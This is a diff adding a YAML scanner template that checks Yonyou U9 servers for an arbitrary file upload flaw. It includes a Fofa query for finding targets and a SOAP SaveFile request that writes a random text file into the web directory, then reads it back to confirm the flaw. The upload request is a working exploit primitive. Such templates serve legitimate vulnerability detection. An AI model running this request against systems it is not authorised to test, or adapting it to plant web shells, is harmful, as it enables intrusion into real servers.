@@ -1,0 +1,43 @@
+id: yonyou-u9-patchfile-fileupload
+
+info:
+  name: 用友U9 PatchFile.asmx接口任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: app="用友U9"
+  reference:
+    - https://mp.weixin.qq.com/s/_xRsb-48Chf16cEDwO1xpg
+  tags: yonyou,u9,fileupload
+  created: 2024/02/28
+
+set:
+  filename: randomLowercase(6)
+  randBody: randomLowercase(32)
+  base64Body: base64(randBody)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CS/Office/AutoUpdates/PatchFile.asmx
+      headers:
+        Content-Type: text/xml; charset=utf-8
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <SaveFile xmlns="http://tempuri.org/">
+              <binData>{{base64Body}}</binData>
+              <path>./</path>
+              <fileName>{{filename}}.txt</fileName>
+            </SaveFile>
+          </soap:Body>
+        </soap:Envelope>
+    expression: response.status == 200 && response.body.bcontains(b'<SaveFileResult>')
+  r1:
+    request:
+      method: GET
+      path: /CS/Office/AutoUpdates/{{filename}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(randBody))
+expression: r0() && r1()
